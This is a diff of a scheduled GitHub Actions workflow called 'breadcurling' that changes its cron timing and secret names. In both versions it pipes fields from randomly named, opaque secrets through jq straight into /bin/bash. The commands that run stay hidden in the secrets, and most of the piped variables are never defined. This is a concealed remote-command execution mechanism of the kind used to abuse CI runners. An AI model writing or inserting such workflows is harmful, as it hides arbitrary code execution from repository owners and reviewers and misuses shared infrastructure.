@@ -1,22 +1,20 @@
 name: breadcurling
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 2/6 * * *'
+    - cron: '2 5/6 * * *'
 
-jobs:  # 3047
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: breadcurling
         env:
-          kqag88: ${{ secrets.kqag88 }}
+          xn2269: ${{ secrets.xn2269 }}
         run: |
-          echo $kqag88 | jq -r .q71319 | /bin/bash
-          echo $lfpci3831 | jq -r .d1516 | /bin/bash
-          echo $dbsg47804 | jq -r .qel90 | /bin/bash
-          echo $g2 | jq -r .k2179 | /bin/bash
-          echo $zz09432 | jq -r .ioh2549 | /bin/bash
+          echo $xn2269 | jq -r .d0 | /bin/bash
+          echo $pkhg8 | jq -r .iita0 | /bin/bash
+          echo $l549 | jq -r .ywwlb24877 | /bin/bash
 
